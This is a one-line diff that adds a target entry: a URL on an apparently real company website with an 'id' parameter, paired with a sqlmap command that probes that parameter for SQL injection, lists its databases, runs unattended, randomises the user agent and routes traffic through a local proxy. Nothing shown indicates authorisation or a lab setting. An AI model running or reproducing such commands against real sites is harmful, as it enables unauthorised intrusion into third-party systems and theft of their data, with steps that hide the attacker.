@@ -1,0 +1,1 @@
+http://www.sh-jiahu.com/about/show.php?id=1 (GET)  # .\sqlmap.py -m .\url.txt --dbs --batch --force-ssl --random-agent -p id --output-dir result --proxy=http://127.0.0.1:7890
